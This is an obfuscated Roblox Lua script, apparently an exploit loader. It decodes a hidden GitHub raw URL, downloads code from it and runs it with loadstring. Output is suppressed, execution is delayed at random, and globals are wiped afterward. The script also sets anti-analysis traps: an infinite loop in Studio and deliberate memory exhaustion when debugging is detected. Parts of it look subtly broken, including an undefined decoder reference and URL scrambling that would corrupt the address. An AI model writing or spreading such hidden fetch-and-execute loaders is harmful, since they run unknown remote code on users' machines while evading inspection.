--[[
该文件由 Killer obfuscate保护
制作者 Alert   文件作者Syndrome
Security Level: MILSPEC+++
--]]

local _=(function()
 
    if not game:GetService("RunService"):IsStudio() then
        local a=math.random(100,999)
        local b=string.char
        local c=table.concat
        
       
        local d=function(e)
            local f={}
            for g=1,#e do
                f[g]=b((e:byte(g)+a+(g*7%13))%256)
            end
            return c(f)
        end
        
      
        local h=function(i)
            local j={}
            for k=1,#i,2 do
                j[#j+1]=b((tonumber(i:sub(k,k+1),16)-a-(k*11%17))%256)
            end
            return c(j)
        end
        
        return {enc=d,dec=h,key=a}
    else
       
        while true do end
    end
end)()


(function()
    local dbg=debug.getinfo or function() return {} end
    if #dbg()>3 or #dbg(1)>0 then
        local t={}
        while true do
            t[#t+1]=Vector3.new(math.random(),math.random(),math.random())
        end
    end
end)()


local _M=setmetatable({},{
    __index=function(t,k)
        
        local dynKey = tostring(math.random(10000,99999)):reverse()
        
        local _D={
            ["K3Y1"]=_S.dec("68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f53796e64726f6d65687368732f6c6f6c2f726566732f68656164732f6d61696e2f6c6f6c")..dynKey,
        }
        return _D[k] or error("Security Violation")
    end,
    __newindex=function() error("Write Protection Active") end
})


local function _genURL()
    local parts = {}
    local key = _M["K3Y1"]
    local seed = math.random(1,1000)
    
    for i=1,#key,3 do
        parts[#parts+1] = string.char((key:byte(i)+seed)%256)
        parts[#parts+1] = string.char((key:byte(i+1)+seed*2)%256)
        parts[#parts+1] = string.char((key:byte(i+2)+seed*3)%256)
    end
    
    
    local randParam = "?v="..tostring(math.random(10000,99999)).."&t="..tostring(os.time())
    return table.concat(parts):sub(1,-3)..randParam
end


local function _exec()
    local url = _genURL()
    local success, content = pcall(function()
        return game:HttpGetAsync(url, true)
    end)
    
    if success and content then
        local fn, err = loadstring(content)
        if fn then
            setfenv(fn,{
                print=function()end,
                warn=function()end,
                game=setmetatable({},{__index=game,__newindex=function()end})
            })
            delay(math.random()*0.5, function()
                pcall(fn)
            end)
        end
    end
end


if not game:GetService("RunService"):IsStudio() then
    _exec()
end


(function()
    _=nil;_M=nil
    for k,v in pairs(_G)do
        if type(v)=="function"and debug.getupvalue(v,1)then
            _G[k]=nil
        end
    end
    collectgarbage("collect")
    collectgarbage("stop")
end)()
